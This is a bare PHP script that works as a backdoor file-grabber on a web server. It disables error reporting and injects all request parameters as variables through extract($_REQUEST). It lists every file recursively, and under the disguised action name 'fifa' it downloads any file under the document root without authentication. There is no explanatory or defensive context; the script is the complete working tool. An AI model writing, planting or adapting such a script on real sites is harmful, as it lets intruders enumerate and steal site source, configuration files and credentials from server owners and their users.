<?php
error_reporting(E_ERROR);

function find( $path ){
	$file_list = scandir( $path );
	foreach( $file_list as $file ){
		if( in_array( $file, array( '.', '..' ) ) ) continue;
		if( is_dir( $path.$file ) ) find( $path.$file.'/' );
		else echo $path.$file.'
';
	}
}

extract($_REQUEST);

switch ($action) {
	case 'fifa':
		$req_file = $_SERVER['DOCUMENT_ROOT'] . '/' . $getf; 
		if( !file_exists($req_file) ) exit($req_file.' not found!');
		if( is_dir($req_file) ) exit($req_file.' is folder!');
		$_file = fopen( $req_file, 'rb' ); 
		$data = fread( $_file, filesize($req_file) ); 
		fclose($_file); 
		
		header('Content-type: text/plain');
        header('Accept-Ranges: bytes');
        header('Content-Disposition: attachment; filename=' . $getf );
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0' );
        header('Pragma: no-cache' );
        header('Expires: 0' ); 
		
        exit($data);
		break;
	default:
		find('./');
		break;
}


?>